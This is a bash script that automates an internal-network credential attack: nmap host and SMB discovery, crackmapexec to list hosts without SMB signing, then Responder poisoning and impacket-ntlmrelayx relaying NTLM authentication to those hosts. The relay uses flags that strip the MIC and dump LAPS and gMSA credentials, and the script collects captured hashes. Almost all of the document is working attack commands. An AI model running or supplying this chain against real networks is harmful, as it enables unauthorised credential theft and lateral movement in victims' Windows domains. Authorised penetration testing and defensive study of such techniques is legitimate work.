#!/bin/bash

#Creating Output Folders
mkdir -p /root/output/nmap /root/output/list

#NMAP PE SCAN

echo 'NMAP PE Scan'
nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/pe $1 > /dev/null 2>&1
echo ''
echo 'Done'


#Piping the IP-Addresses of the Targets to a file
awk '/Up/ {print$2}' /root/output/pe.gnmap > /root/output/ips.txt
echo ''

cat /root/output/ips.txt

#NMAP Portscan for port 445
echo 'NMAP Portscan 445'
nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/445 -iL /root/output/ips.txt > /dev/null 2>&1
echo ''
echo 'Done'

#Piping IP's with 445 open to a file
awk '/open/ {print$2}' /root/output/445.gnmap > /root/output/445_open.txt
echo ''

cat /root/output/445_open.txt

#Using Crackmap to Check which of the IP's with 445 open have Signing:false
echo 'Generating Relay List'
crackmapexec smb /root/output/445_open.txt --gen-relay-list /root/output/smb_sign_off.txt
echo 'Done'

cat /root/output/smb_sign_off.txt

#When Clients with Signing:false exist
if [ -s /root/output/smb_sign_off.txt ] 
	then
	echo ''
	
	#Responder with 300sec timeout in bg
	echo 'Starting Responder'
	timeout 300 responder -I eth0 -rdwv > /dev/null 2>&1 &
	echo ''
	echo 'Done'
	echo ''

	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
	echo 'Starting NTLM-Relay'
	timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/smb_sign_off.txt > /dev/null 2>&1 &
	echo ''

	#Declaring variables for each PID of Responder and NTLMRelayX
	echo 'Waiting for Hashes'

	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`

	#Waiting for Jobs to despawn
	wait $PID_RESPONDER
	wait $PID_RELAY
	
	#When Output-File exists and is not empty
	if [ -s /root/output/ntlm_relay_ntlmv2.txt ]
		then
		#Show me 'dem Hashes
		cat /root/output/ntlm_relay_ntlmv2.txt

		else
		echo 'No Hashes Found'
	fi
else
	echo 'Either Signing is ON everywhere or no SMB Service available.'
fi


